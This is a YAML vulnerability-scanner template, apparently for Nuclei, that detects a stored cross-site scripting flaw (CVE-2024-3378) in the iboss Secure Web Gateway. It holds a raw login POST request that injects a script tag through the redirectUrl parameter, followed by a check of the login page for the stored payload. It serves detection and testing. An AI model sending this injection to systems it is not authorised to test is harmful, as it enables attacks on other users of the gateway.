id: iboss-stored-xss
info:
  author: Vulnpire
  description: "A stored Cross Site Scripting (XSS) vulnerability was found in the\
    \ iboss Secure Web Gateway product.  The vulnerability is exploited by submitting\
    \ a login attempt, intercepting the request,  and adding a payload to the \"redirectUrl\"\
    \ parameter before sending it to the server. \n"
  name: iboss Secure Web Gateway - Stored Cross-Site Scripting (XSS)
  reference:
  - https://github.com/modrnProph3t/CVE/blob/main/CVE-2024-3378.md
  severity: high
  tags: xss, stored
requests:
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - prompt('XSS')
  matchers-condition: and
  raw:
  - 'POST /user_login_submit HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    userName=TEST&x=TEST&action=login&redirectUrl=%22%3E%3Cscript%3Eprompt(''XSS'')%3C/script%3E

    '
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <script>prompt('XSS')</script>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login'
